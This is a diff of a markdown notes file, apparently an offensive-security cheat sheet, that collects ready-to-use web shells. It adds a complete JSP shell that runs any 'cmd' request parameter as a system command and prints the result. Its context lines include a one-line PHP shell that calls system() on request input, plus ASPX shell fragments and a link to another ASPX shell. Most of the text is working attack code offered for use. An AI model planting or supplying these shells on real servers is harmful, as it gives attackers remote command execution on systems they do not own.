@@ -1,4 +1,6 @@
-## PHP Webshell
+__tags: webshell
+
+#### PHP Webshell
 
 ```php
 $phpCode = <<<'EOD'
@@ -14,14 +16,14 @@ $phpCode = <<<'EOD'
  EOD;
 ```
 
-## php webshell2
+#### php webshell2
 
 ```php
 
 <?php echo "SuperAwesomeShell";system($_REQUEST['command']); ?>
 ```
 
-## Here is a nice ASPX one (Used for ISS around server 2012 ish, might work for 2016??):
+#### Here is a nice ASPX one (Used for ISS around server 2012 ish, might work for 2016??):
 
 github.com/SecWiki/WebShell-2/blob/master/Aspx/awen%20asp.net%20webshell.aspx
 
@@ -70,4 +72,42 @@ Response.Write("</pre>");
 <!--    http://michaeldaw.org   04/2007    -->
 
 
+```
+
+#### Simple JSP that works with burp well!!!
+
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
 ```
